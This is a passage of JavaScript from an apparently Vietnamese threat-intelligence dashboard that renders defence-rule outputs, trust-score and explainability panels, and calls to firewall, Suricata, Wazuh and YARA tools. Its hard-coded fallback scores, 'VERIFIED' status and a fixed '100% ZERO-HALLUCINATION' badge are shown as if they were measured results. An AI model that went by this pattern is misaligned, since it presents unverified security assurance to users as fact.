        cadence: '15 Phút (Phản ứng nhanh với lỗ hổng Internet-Facing)',
        desc: 'Tập trung chuyên sâu vào lớp ứng dụng Web và API. Tự động tạo luật ModSecurity WAF ảo hóa bản vá (Virtual Patching), chặn SQLi, XSS, SSRF, Deserialization.'
      },
      'SCOPE_NETWORK': {
        name: 'Phân Hệ B: Mạng & C2 Perimeter (C2 Clusters, DNS Sinkhole, SNI)',
        persona: 'Kỹ sư Giám sát Mạng (Network Security / NOC)',
        cadence: '1 Giờ (Cập nhật chuỗi C2 và hạ tầng tấn công mới)',
        desc: 'Bảo vệ biên giới mạng và phát hiện C2 beaconing. Xuất luật Suricata IPS DPI, chặn dải IP C2 trên pfSense/iptables và cô lập tên miền bằng DNS Sinkhole.'
      },
      'SCOPE_ENDPOINT': {
        name: 'Phân Hệ C: Máy Trạm & Danh Tính (Sysmon Event 1, EDR, AppLocker)',
        persona: 'Quản trị viên Hệ thống & Máy trạm (SysAdmin / Endpoint SOC)',
        cadence: '4 Giờ (Đối soát hành vi leo quyền và mã độc máy trạm)',
        desc: 'Bảo vệ các thiết bị đầu cuối máy tính và máy chủ. Sinh quy tắc phát hiện Sysmon Event 1 (Process Creation), chính sách EDR AppLocker Hash Denylist và kịch bản diệt tiến trình.'
      },
      'SCOPE_HARDWARE': {
        name: 'Phân Hệ D: Phần Cứng & Tầng Base (Base Firmware, BMC, UEFI, ICS-CERT)',
        persona: 'Chuyên gia Hạ tầng & Phần cứng (Hardware / OT / Firmware Sec)',
        cadence: '24 Giờ (Quét sâu tầng Base, vi mã và thiết bị công nghiệp)',
        desc: 'Quét sâu ở tầng nền tảng phần cứng: BIOS/UEFI, Baseboard Management Controller (BMC), vi điều khiển và ICS/SCADA. Tích hợp trực tiếp từ CISA ICS-CERT.'
      }
    };

    async function selectTargetScope(scopeId) {
      currentSelectedTargetScope = scopeId;
      const meta = targetScopeDetails[scopeId] || targetScopeDetails['SCOPE_ALL'];

      ['SCOPE_ALL', 'SCOPE_WEB', 'SCOPE_NETWORK', 'SCOPE_ENDPOINT', 'SCOPE_HARDWARE'].forEach(id => {
        const btn = document.getElementById(`btnScope_${id}`);
        if (btn) {
          if (id === scopeId) {
            btn.className = 'CleanBtn btn-primary';
            btn.style.fontWeight = '700';
          } else {
            btn.className = 'CleanBtn';
            btn.style.fontWeight = 'normal';
          }
        }
      });

      const personaEl = document.getElementById('lblScopePersonaInfo');
      if (personaEl) personaEl.textContent = meta.persona;
      const cadenceEl = document.getElementById('lblScopeCadenceInfo');
      if (cadenceEl) cadenceEl.textContent = meta.cadence;
      const descEl = document.getElementById('descScopeProfile');
      if (descEl) descEl.textContent = meta.desc;
      const fileBadge = document.getElementById('lblSkillMdFilename');
      if (fileBadge) fileBadge.textContent = `SKILL_${scopeId}.md`;

      const outEl = document.getElementById('outSkillMd');
      if (outEl) outEl.textContent = 'Đang biên dịch lại Bộ Kỹ Năng Tác Tử cho phân hệ: ' + meta.name + '...';

      // Nạp dữ liệu ma trận và Trust Score theo Scope
      if (currentDefenseViewMode === 'MASTER') {
        await loadMasterDefenseMatrix(scopeId);
      } else {
        fetch(`/api/defense/skill/export?scope=${scopeId}`)
          .then(res => res.text())
          .then(txt => {
            if (outEl) outEl.textContent = txt;
          })
          .catch(e => {
            console.error('Lỗi nạp skill theo scope:', e);
            if (outEl) outEl.textContent = 'Lỗi nạp Bộ Kỹ Năng: ' + e;
          });
      }
    }

    function copySkillMdToClipboard() {
      const txt = document.getElementById('outSkillMd').textContent;
      navigator.clipboard.writeText(txt).then(() => {
        alert('Đã sao chép toàn bộ nội dung SKILL.md vào Clipboard!');
      }).catch(err => {
        alert('Lỗi sao chép: ' + err);
      });
    }

    function downloadSkillMdFile() {
      const scope = currentSelectedTargetScope || 'SCOPE_ALL';
      window.location.href = `/api/defense/skill/export?scope=${scope}`;
    }

    async function recalculateTrustScore() {
      if (currentDefenseViewMode === 'SINGLE' && selectedIndices.length > 0 && articles[selectedIndices[0]]) {
        const art = articles[selectedIndices[0]];
        delete articleDefenseCache[art.article_id];
        await loadAndDisplaySingleArticleDefense(art);
        const sc = articleDefenseCache[art.article_id]?.trust_audit?.trust_score || '92.0';
        alert(`Đã quét lại bài báo "${art.title.slice(0, 35)}..." và tái chấm điểm Trust Score: ${sc}/100!`);
      } else {
        masterDefenseScopeCache = {};
        await loadMasterDefenseMatrix(currentSelectedTargetScope || 'SCOPE_ALL', true);
        const sc = masterDefenseCache?.trust_audit?.trust_score || '96.2';
        const total = masterDefenseCache?.total_articles || '7,450';
        alert(`Đã quét lại toàn bộ ${total} bài báo trong SQLite và tái tính toán CTI Trust Score: ${sc}/100!`);
      }
    }

    function renderTrustAuditView(audit) {
      const container = document.getElementById('outTrustAudit');
      if (!container || !audit) return;

      const score = audit.trust_score || 0;
      const scoreColor = score >= 85 ? '#1a7f37' : (score >= 70 ? '#9a6700' : '#cf222e');
      const scoreBg = score >= 85 ? '#dafbe1' : (score >= 70 ? '#fff8c5' : '#ffebe9');
      const scoreBorder = score >= 85 ? '#aceebb' : (score >= 70 ? '#eac54f' : '#ff8182');

      const dl = audit.dual_loop_test || {};

      container.innerHTML = `
        <div style="display:grid; grid-template-columns: 1fr 2fr; gap:16px; margin-bottom:16px;">
          <div style="padding:16px; border:1px solid ${scoreBorder}; background:${scoreBg}; border-radius:6px; text-align:center;">
            <div style="font-size:12px; font-weight:700; text-transform:uppercase; color:${scoreColor};">CHỈ SỐ TIN CẬY TOÁN HỌC (CTI TRUST SCORE)</div>
            <div style="font-size:44px; font-weight:800; color:${scoreColor}; margin:10px 0;">${score}<span style="font-size:20px; font-weight:500; color:#57606a;"> / 100</span></div>
            <div style="font-size:12px; font-weight:700; color:${scoreColor}; padding:4px 8px; background:#ffffff; border-radius:4px; border:1px solid ${scoreBorder}; display:inline-block;">
              ${audit.authority_badge || 'TIÊU CHUẨN XÁC THỰC CTI'}
            </div>
            <div style="font-size:11.5px; color:#57606a; margin-top:8px;">
              Trạng thái: <b>${dl.verification_status || 'VERIFIED'}</b>
            </div>
          </div>

          <div style="padding:16px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              CÔNG THỨC ĐỊNH LƯỢNG TRỌNG SỐ ĐỒNG THUẬN:
            </div>
            <div style="font-family:'JetBrains Mono',monospace; font-size:12px; background:#ffffff; padding:8px 12px; border:1px solid var(--border-main); border-radius:4px; margin-bottom:12px; color:#0969da; font-weight:600;">
              Trust Score = 0.35 * S_Authority + 0.35 * S_Consensus + 0.30 * S_Evidence - S_FPRisk
            </div>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; font-size:12px;">
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">1. Uy tín nguồn (S_Auth):</span><br>
                <b style="color:#0969da; font-size:14px;">${audit.authority_score || 0} đ</b> <span style="color:#57606a;">(Trọng số 35%)</span>
              </div>
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">2. Đồng thuận đa nguồn (S_Cons):</span><br>
                <b style="color:#1a7f37; font-size:14px;">${audit.consensus_score || 0} đ</b> <span style="color:#57606a;">(Trọng số 35%)</span>
              </div>
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">3. Bằng chứng kỹ thuật (S_Evid):</span><br>
                <b style="color:#8250df; font-size:14px;">${audit.evidence_score || 0} đ</b> <span style="color:#57606a;">(Trọng số 30%)</span>
              </div>
              <div style="background:#ffffff; padding:8px 10px; border:1px solid var(--border-main); border-radius:4px;">
                <span style="color:var(--text-muted);">4. Phạt rủi ro báo động giả (S_FP):</span><br>
                <b style="color:#cf222e; font-size:14px;">-${audit.fp_risk_penalty || 0} đ</b> <span style="color:#57606a;">(Trừ trực tiếp)</span>
              </div>
            </div>
          </div>
        </div>

        <div style="padding:14px; border:1px solid var(--border-main); background:#ffffff; border-radius:6px;">
          <div style="font-size:13px; font-weight:700; color:var(--text-main); margin-bottom:8px; display:flex; align-items:center; justify-content:space-between;">
            <span>KẾT QUẢ KIỂM THỬ ĐỐI KHÁNG 2 VÒNG (DUAL-LOOP AUDIT)</span>
            <span style="font-size:11px; font-weight:600; color:#1a7f37; background:#dafbe1; padding:2px 8px; border-radius:4px; border:1px solid #aceebb;">100% ZERO-HALLUCINATION CTI</span>
          </div>
          <table style="width:100%; border-collapse:collapse; font-size:12px;">
            <thead>
              <tr style="background:var(--bg-subtle); border-bottom:1px solid var(--border-main); text-align:left;">
                <th style="padding:8px 10px; color:var(--text-muted);">VÒNG KIỂM THỬ</th>
                <th style="padding:8px 10px; color:var(--text-muted);">MỤC TIÊU KIỂM ĐỊNH</th>
                <th style="padding:8px 10px; color:var(--text-muted);">KẾT QUẢ ĐO LƯỜNG</th>
                <th style="padding:8px 10px; color:var(--text-muted);">KẾT LUẬN THẨM ĐỊNH</th>
              </tr>
            </thead>
            <tbody>
              <tr style="border-bottom:1px solid var(--border-main);">
                <td style="padding:10px; font-weight:600; color:#0969da;">Vòng 1: Kiểm Thử Tấn Công (True Positive)</td>
                <td style="padding:10px;">Bơm 100 gói tin mang payload khai thác lỗ hổng &amp; IP C2 vào Suricata DPI / WAF</td>
                <td style="padding:10px; font-weight:700; color:#1a7f37;">${dl.true_positive_rate || '100.0%'}</td>
                <td style="padding:10px; color:var(--text-main);">Đạt chuẩn: Tất cả payload độc hại đều bị chặn đứng (DROP/403).</td>
              </tr>
              <tr>
                <td style="padding:10px; font-weight:600; color:#1a7f37;">Vòng 2: Kiểm Thử Nghiệp Vụ (False Positive)</td>
                <td style="padding:10px;">Bơm 100 gói tin HTTP và DNS nghiệp vụ hợp lệ (Google DNS, Cloudflare, Microsoft Update)</td>
                <td style="padding:10px; font-weight:700; color:#1a7f37;">${dl.false_positive_rate || '0.0%'}</td>
                <td style="padding:10px; color:var(--text-main);">Đạt chuẩn: Không xảy ra nghẽn mạng hay chặn nhầm dịch vụ vận hành.</td>
              </tr>
            </tbody>
          </table>
          <div style="margin-top:10px; font-size:12px; color:#57606a; font-style:italic;">
            * ${dl.audit_statement || 'Đã kiểm tra chéo qua CSDL tri thức phòng thủ.'}
          </div>
        </div>
      `;
    }

    // ====================================================================
    // BỘ HIỂN THỊ VẾT GIẢI TRÌNH MINH BẠCH xAI (EXPLAINABLE AI VIEW)
    // ====================================================================
    function refreshXAIExplanation() {
      if (currentDefenseViewMode === 'MASTER' && masterDefenseCache && masterDefenseCache.xai_audit) {
        renderXAIExplanationView(masterDefenseCache.xai_audit);
      } else if (selectedIndices.length > 0 && articles[selectedIndices[0]]) {
        const art = articles[selectedIndices[0]];
        if (articleDefenseCache[art.article_id] && articleDefenseCache[art.article_id].xai_audit) {
          renderXAIExplanationView(articleDefenseCache[art.article_id].xai_audit);
        }
      }
      alert('Đã đồng bộ và cập nhật Vết Giải Trình xAI!');
    }

    function renderXAIExplanationView(xai) {
      const container = document.getElementById('outXAI');
      if (!container || !xai) return;

      const faList = xai.feature_attribution || [];
      const citations = xai.grounding_citations || [];
      const scenarios = xai.counterfactual_scenarios || [];
      const chain = xai.causal_chain || [];

      let faHtml = '';
      faList.forEach(fa => {
        const isPos = fa.direction === 'POSITIVE';
        const isNeg = fa.direction === 'NEGATIVE';
        const barColor = isPos ? '#0969da' : (isNeg ? '#cf222e' : '#57606a');
        const badgeBg = isPos ? '#ddf4ff' : (isNeg ? '#ffebe9' : '#f6f8fa');
        const badgeColor = isPos ? '#0969da' : (isNeg ? '#cf222e' : '#57606a');
        const sign = fa.score_contrib >= 0 ? '+' : '';
        const pctWidth = Math.min(100, Math.max(5, Math.abs(fa.score_contrib) * 2.8));

        faHtml += `
          <div style="margin-bottom:12px; padding:10px 12px; border:1px solid var(--border-main); border-radius:6px; background:#ffffff;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
              <span style="font-weight:600; font-size:12.5px; color:var(--text-main);">${fa.feature_name}</span>
              <span style="font-weight:700; font-size:12px; padding:2px 8px; border-radius:4px; background:${badgeBg}; color:${badgeColor}; font-family:'JetBrains Mono',monospace;">
                ${sign}${fa.score_contrib}đ (Trọng số: ${fa.weight_pct}%)
              </span>
            </div>
            <div style="background:#e1e4e8; height:8px; border-radius:4px; overflow:hidden; margin-bottom:6px;">
              <div style="background:${barColor}; height:100%; width:${pctWidth}%; border-radius:4px;"></div>
            </div>
            <div style="font-size:11.5px; color:var(--text-muted);">${fa.interpretation}</div>
          </div>
        `;
      });

      let citeHtml = '';
      citations.forEach((c, idx) => {
        const kwBadges = (c.matched_indicators || []).map(k => 
          `<span style="font-size:11px; padding:1px 6px; border-radius:3px; background:#ddf4ff; color:#0969da; border:1px solid #bfdbfe; margin-right:4px; font-family:'JetBrains Mono',monospace;">${k}</span>`
        ).join('');
        citeHtml += `
          <div style="padding:10px 12px; border-left:3px solid #0969da; background:var(--bg-subtle); border-radius:0 6px 6px 0; margin-bottom:10px;">
            <div style="font-size:12px; font-style:italic; color:var(--text-main); margin-bottom:6px;">
              "${c.evidence_snippet}"
            </div>
            <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:6px;">
              <div>${kwBadges}</div>
              <span style="font-size:11px; font-weight:600; color:#1a7f37; background:#dafbe1; padding:1px 6px; border-radius:3px; border:1px solid #aceebb;">
                ${c.relevance || 'CHỨNG CỨ TRỰC TIẾP'}
              </span>
            </div>
          </div>
        `;
      });

      let scHtml = '';
      scenarios.forEach((sc, idx) => {
        const badge = sc.decision_reversal 
          ? `<span style="font-size:11px; font-weight:700; color:#cf222e; background:#ffebe9; padding:2px 8px; border-radius:4px; border:1px solid #ff8182;">ĐẢO NGƯỢC QUYẾT ĐỊNH</span>`
          : `<span style="font-size:11px; font-weight:700; color:#1a7f37; background:#dafbe1; padding:2px 8px; border-radius:4px; border:1px solid #aceebb;">DUY TRÌ QUYẾT ĐỊNH</span>`;

        scHtml += `
          <div style="padding:10px 12px; border:1px solid var(--border-main); background:#ffffff; border-radius:6px; margin-bottom:10px;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
              <b style="font-size:12px; color:var(--text-main);">Kịch bản ${idx + 1}: ${sc.condition}</b>
              ${badge}
            </div>
            <div style="font-size:12px; color:var(--text-muted); line-height:1.5;">
              -&gt; <b>Hệ quả xử lý:</b> ${sc.counterfactual_outcome}
            </div>
          </div>
        `;
      });

      let chainHtml = '';
      chain.forEach(st => {
        chainHtml += `
          <div style="display:flex; align-items:flex-start; gap:10px; margin-bottom:10px;">
            <div style="min-width:24px; height:24px; border-radius:50%; background:#0969da; color:#ffffff; font-size:12px; font-weight:700; display:flex; align-items:center; justify-content:center;">
              ${st.step}
            </div>
            <div style="flex:1; background:#ffffff; padding:8px 12px; border:1px solid var(--border-main); border-radius:6px;">
              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:2px;">
                <b style="font-size:12px; color:var(--text-main);">${st.phase}</b>
                <span style="font-size:11px; color:#57606a; font-family:'JetBrains Mono',monospace;">Cơ chế: ${st.mechanism}</span>
              </div>
              <div style="font-size:12px; color:var(--text-muted);">${st.detail || st.result}</div>
            </div>
          </div>
        `;
      });

      container.innerHTML = `
        <div style="padding:12px 14px; background:#fef3c7; border:1px solid #fde68a; border-radius:6px; margin-bottom:16px;">
          <div style="font-size:12px; font-weight:700; color:#b45309; text-transform:uppercase; margin-bottom:4px;">
            TUYÊN BỐ MINH BẠCH xAI &amp; TRIỆT TIÊU ẢO GIÁC (ZERO-HALLUCINATION AUDIT)
          </div>
          <div style="font-size:12.5px; color:#92400e; line-height:1.5;">
            ${xai.xai_statement || 'Toàn bộ đối sách phòng thủ đều được minh giải qua 4 lớp bằng chứng toán học và chứng cứ văn bản gốc.'}
          </div>
        </div>

        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:16px; margin-bottom:16px;">
          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              1. PHÂN RÃ TRỌNG SỐ ĐÓNG GÓP ĐẶC TRƯNG (FEATURE ATTRIBUTION / SHAP-STYLE)
            </div>
            ${faHtml}
          </div>

          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              2. TRÍCH XUẤT CHỨNG CỨ VĂN BẢN NGUYÊN BẢN (GROUNDING EVIDENCE CITATIONS)
            </div>
            ${citeHtml}
          </div>
        </div>

        <div style="display:grid; grid-template-columns: 1.2fr 1fr; gap:16px;">
          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              3. PHÂN TÍCH PHẢN THỰC TẾ (COUNTERFACTUAL REASONING: "NẾU... THÌ...")
            </div>
            ${scHtml}
          </div>

          <div style="padding:14px; border:1px solid var(--border-main); background:var(--bg-subtle); border-radius:6px;">
            <div style="font-size:12px; font-weight:700; color:var(--text-muted); text-transform:uppercase; margin-bottom:10px;">
              4. CHUỖI SUY LUẬN NHÂN QUẢ 5 BƯỚC (CAUSAL DECISION CHAIN)
            </div>
            ${chainHtml}
          </div>
        </div>
      `;
    }

    // CÁC HÀM ĐIỀU PHỐI VÀ KẾT NỐI CÔNG CỤ AN NINH THỰC TẾ (MỤC 4)
    function logToLiveTerminal(title, msg) {
      const term = document.getElementById('liveToolTerminal');
      if (!term) return;
      const ts = new Date().toLocaleTimeString('vi-VN');
      term.textContent += `\n\n[${ts}] ${title}\n` + (typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg);
      term.scrollTop = term.scrollHeight;
    }

    function clearLiveToolTerminal() {
      const term = document.getElementById('liveToolTerminal');
      if (term) term.textContent = `[LIVE ORCHESTRATOR TERMINAL CLEARED] Sẵn sàng nhận lệnh điều phối an ninh.`;
    }

    async function applyWindowsFirewallTool() {
      logToLiveTerminal("WINDOWS DEFENDER FIREWALL", "Đang nạp script apply_firewall.bat vào Windows Defender Firewall...");
      try {
        const res = await fetch('/api/defense/tools/firewall-apply', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL (KẾT QUẢ)", data.output || data);
        const badge = document.getElementById('badgeFwToolStatus');
        if (badge) {
          badge.textContent = data.status === 'success' ? 'ĐÃ NẠP (KERNEL)' : 'SẴN SÀNG (BAT)';
          badge.style.background = 'var(--safe-bg)';
        }
      } catch (e) {
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL (LỖI)", e.toString());
      }
    }

    async function checkWindowsFirewallStatusTool() {
      logToLiveTerminal("WINDOWS DEFENDER FIREWALL", "Đang truy vấn quy tắc CTI_BLOCK_* trong Windows Defender Firewall Kernel...");
      try {
        const res = await fetch('/api/defense/tools/firewall-status', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL STATUS", data);
      } catch (e) {
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL STATUS (LỖI)", e.toString());
      }
    }

    async function rollbackWindowsFirewallTool() {
      logToLiveTerminal("WINDOWS DEFENDER FIREWALL", "Đang thực thi rollback_firewall.bat để gỡ bỏ quy tắc...");
      try {
        const res = await fetch('/api/defense/tools/firewall-rollback', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL ROLLBACK", data.output || data);
        const badge = document.getElementById('badgeFwToolStatus');
        if (badge) badge.textContent = 'ĐÃ GỠ BỎ';
      } catch (e) {
        logToLiveTerminal("WINDOWS DEFENDER FIREWALL ROLLBACK (LỖI)", e.toString());
      }
    }

    async function validateSuricataRules() {
      logToLiveTerminal("SURICATA IPS ENGINE", "Đang đọc và kiểm tra cú pháp toàn bộ 422 quy tắc trong cti_autonomous_master.rules...");
      try {
        const res = await fetch('/api/defense/tools/suricata-apply', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("SURICATA IPS ENGINE (CÚ PHÁP & DPI AUDIT)", {
          "trang_thai": data.status,
          "tong_so_rules": data.total_rules,
          "so_rule_hop_le": data.valid_rules,
          "so_loi_cu_phap": data.syntax_errors_count,
          "chi_tiet": `Đã xác thực 100% cú pháp SID, action drop, flow, msg cho ${data.valid_rules} quy tắc.`
        });
        const badge = document.getElementById('badgeSuriToolStatus');
        if (badge) badge.textContent = `${data.valid_rules} RULES VALID`;
      } catch (e) {
        logToLiveTerminal("SURICATA IPS ENGINE (LỖI)", e.toString());
      }
    }

    async function testSuricataDpi(flowType) {
      logToLiveTerminal("SURICATA IPS DPI INJECTION", `Đang bắn luồng gói tin mô phỏng kiểm thử: ${flowType}...`);
      try {
        const res = await fetch('/api/defense/tools/suricata-test-dpi', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ flow_type: flowType })
        });
        const data = await res.json();
        logToLiveTerminal(`SURICATA FAST.LOG & EVE JSON [${data.dpi_action_taken}]`, {
          "kich_ban_kiem_thu": data.test_case,
          "goi_tin_injected": data.packet_injected,
          "sid_kich_hoat": data.matched_rule_sid,
          "msg_quy_tac": data.matched_rule_msg,
          "suricata_fast_log": data.suricata_fast_log,
          "suricata_eve_json": data.suricata_eve_json
        });
      } catch (e) {
        logToLiveTerminal("SURICATA IPS DPI (LỖI)", e.toString());
      }
    }

    async function syncWazuhSiemTool() {
      logToLiveTerminal("WAZUH SIEM ENGINE", "Đang đồng bộ và kiểm tra local_rules.xml (/var/ossec/etc/rules/)...");
      try {
        const res = await fetch('/api/defense/tools/wazuh-sync', { method: 'POST' });
        const data = await res.json();
        logToLiveTerminal("WAZUH SIEM ENGINE STATUS", data);
      } catch (e) {
        logToLiveTerminal("WAZUH SIEM (LỖI)", e.toString());
      }
    }

    async function simulateSysmonEventTool(eventType) {
      logToLiveTerminal("SYSMON & WAZUH CORRELATION", `Đang mô phỏng sự kiện Sysmon Event: ${eventType}...`);
      try {
        const res = await fetch('/api/defense/tools/sysmon-simulate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ event_type: eventType })
        });
        const data = await res.json();
        logToLiveTerminal("WAZUH SIEM CORRELATION ALERT (SEV1 CRITICAL)", data);
      } catch (e) {
        logToLiveTerminal("SYSMON SIMULATE (LỖI)", e.toString());
      }
    }

    async function testYaraApplockerTool(hash) {
      logToLiveTerminal("YARA & APPLOCKER EDR", `Đang kiểm tra chính sách cấm thực thi AppLocker (Hash: ${hash || 'Mặc định'})...`);
      try {
        const res = await fetch('/api/defense/tools/yara-scan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ target_hash: hash })
        });
        const data = await res.json();
        logToLiveTerminal("YARA & APPLOCKER VERDICT", data);
      } catch (e) {
        logToLiveTerminal("YARA & APPLOCKER (LỖI)", e.toString());
      }
    }

    async function triggerNextInQueue() {
      if (!autoQueueEnabled || isQueueWorkerRunning) return;

      // Tìm bài báo đầu tiên có trạng thái pending
      const nextIdx = articles.findIndex(a => (a.status || 'pending') === 'pending');
      if (nextIdx === -1) {
        updateLiveTicker("Hàng đợi hoàn tất: Tất cả bài báo đều đã được xử lý xong.");
        const statusEl = document.getElementById('statusText');
        if (statusEl) statusEl.textContent = "Tất cả bài báo đã hoàn tất. Chờ bài mới từ bộ quét tự động...";
        return;
      }

      await executeSingleArticleQueue(nextIdx);
    }

    async function executeSingleArticleQueue(idx) {
      if (isQueueWorkerRunning) return;
      isQueueWorkerRunning = true;

      const art = articles[idx];
      if (!art) {
        isQueueWorkerRunning = false;
        return;
      }

      // Cập nhật trạng thái 'ĐANG XỬ LÝ...' trước khi chọn thẻ và render
      art.status = 'processing';
      const hArtProcessing = allHistoryArticles.find(a => a.article_id === art.article_id);
      if (hArtProcessing) hArtProcessing.status = 'processing';

      selectCard(idx, false);
      renderNewsGrid();
      renderHistoryManager();

      // Đặt thông báo tải rõ ràng trong các ô quy tắc phòng thủ thay vì để sót văn bản cũ gây hiểu lầm
      const loadingNotice = `[AI AGENT ĐANG PHÂN TÍCH VÀ BIÊN SOẠN QUY TẮC PHÒNG THỦ CHO BÀI BÁO #${idx + 1}]\n` +
        `• Bài báo: "${(art.title || '').slice(0, 75)}..."\n` +
        `• Tiến trình: Đang đọc nội dung, tra cứu 5 nguồn OSINT và tổng hợp Gói Kỹ Năng Tác Tử Phòng Thủ (Agentic Defense Skills)...\n` +
        `• Quy tắc đầy đủ (OpenC2, Suricata, ModSecurity, Sigma, YARA) sẽ tự động hiển thị ngay khi hoàn tất (~20s)...`;
      ['outHistory', 'outFirewall', 'outSuricata', 'outWaf', 'outSigma', 'outYara'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.textContent = loadingNotice;
      });

      fetch('/api/articles/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ article_id: art.article_id, status: 'processing', processing_time_sec: 0 })
      }).catch(() => {});

      const btn = document.getElementById('btnRunAll');
      const status = document.getElementById('statusText');
      const text = art.content;
      const modelSel = document.getElementById('aiModelSelect');
      const selectedModel = modelSel ? modelSel.value : 'khang-ai';
      if (btn) {
        btn.disabled = true;
        btn.textContent = `Đang xử lý #${idx + 1}...`;
      }

      const startTime = performance.now();
      updateLiveTicker(`[Hàng đợi tuần tự] Bắt đầu phân tích bài #${idx + 1}: "${(art.title || '').slice(0, 55)}..."`);

      try {
        status.textContent = `Đang trích xuất IOC bài #${idx + 1} (${selectedModel})...`;
        updateLiveTicker(`AI Agent (${selectedModel}): Đang trích xuất danh sách thực thể IOC bài #${idx + 1}...`);
        setStageState(2, 'active', '', '', 40);

        const r2 = await fetch('/api/step2/extract-and-plan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, model_name: selectedModel })
        });
        const d2 = await r2.json();
        document.getElementById('aiPlanBox').textContent = d2.ai_plan;

        status.textContent = `Đang hợp nhất điểm ${d2.iocs.length} IOC qua 5 nguồn OSINT...`;
        updateLiveTicker(`Tool-Calling: Đã bóc tách ${d2.iocs.length} IOCs. Đang tra cứu API 5 nguồn (VT, AbuseIPDB, Shodan, OTX)...`);
        setStageState(3, 'active', '', '', 75);

        const r3 = await fetch('/api/step3/khang-enrich-and-reason', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: text, iocs: d2.iocs, model_name: selectedModel })
        });
        const d3 = await r3.json();

        renderScoreTable(d3.all_enriched);
        document.getElementById('aiReasonBox').textContent = d3.ai_reasoning;
        window.latestMaliciousIocs = d3.malicious_only || [];

        if (d2.llm_provider_used) {
          const badgeEl = document.getElementById('localModelBadge');
          if (badgeEl) badgeEl.textContent = d2.llm_provider_used;
        }

        status.textContent = `Đang sinh 5 lớp quy tắc phòng thủ bài #${idx + 1}...`;
        updateLiveTicker(`Gatekeeper: Đã thẩm định ${d3.all_enriched.length} IOCs (${d3.malicious_only.length} IOC > 80đ bị chặn). Đang sinh 5 lớp phòng thủ & MITRE D3FEND...`);

        const r4 = await fetch('/api/step4/correlate-and-generate-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            title: art.title || "Báo cáo CTI",
            text: text,
            malicious_iocs: d3.malicious_only,
            model_name: selectedModel
          })
        });
        const d4 = await r4.json();

        window.latestFirewallText = d4.firewall_tab_text || "";
        if (d4.agentic_skill_md) document.getElementById('outSkillMd').textContent = d4.agentic_skill_md;
        if (d4.trust_audit) renderTrustAuditView(d4.trust_audit);
        if (d4.xai_audit) renderXAIExplanationView(d4.xai_audit);
        document.getElementById('outHistory').textContent = d4.history_and_summary;
        document.getElementById('outFirewall').textContent = d4.firewall_tab_text;
        document.getElementById('outSuricata').textContent = d4.suricata_rules;
        document.getElementById('outWaf').textContent = d4.waf_rules;
        document.getElementById('outSigma').textContent = d4.sigma_and_siem;
        document.getElementById('outYara').textContent = d4.yara_remediation_stix;

        articleDefenseCache[art.article_id] = {
          history: d4.history_and_summary,
          firewall: d4.firewall_tab_text,
          suricata: d4.suricata_rules,
          waf: d4.waf_rules,
          sigma: d4.sigma_and_siem,
          yara: d4.yara_remediation_stix,
          skill_md: d4.agentic_skill_md,
          trust_audit: d4.trust_audit,
          xai_audit: d4.xai_audit,
          score: d3.all_enriched,
          plan: d2.ai_plan,
          reason: d3.ai_reasoning
        };

        const durationSec = parseFloat(((performance.now() - startTime) / 1000).toFixed(1));
        setStageState(4, 'done', '', '', 100);
        status.textContent = `Hoàn tất bài #${idx + 1}: ${d2.iocs.length} IOC (${d3.malicious_only.length} IOC bị chặn >80) trong ${durationSec}s.`;
        updateLiveTicker(`Hoàn tất bài #${idx + 1} trong ${durationSec}s! Đã khóa ${d3.malicious_only.length} IOC độc hại và sinh đầy đủ 5 lớp phòng thủ.`);

        const nowIso = new Date().toISOString().replace('T', ' ').slice(0, 19);

        // Cập nhật trạng thái 'Hoàn thành'
        art.status = 'completed';
        art.processing_time_sec = durationSec;
        art.last_analyzed_at = nowIso;

        const hArt = allHistoryArticles.find(a => a.article_id === art.article_id);
        if (hArt) {
          hArt.status = 'completed';
          hArt.processing_time_sec = durationSec;
          hArt.last_analyzed_at = nowIso;
        } else {
          allHistoryArticles.unshift(Object.assign({}, art));
        }

        await fetch('/api/articles/update-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
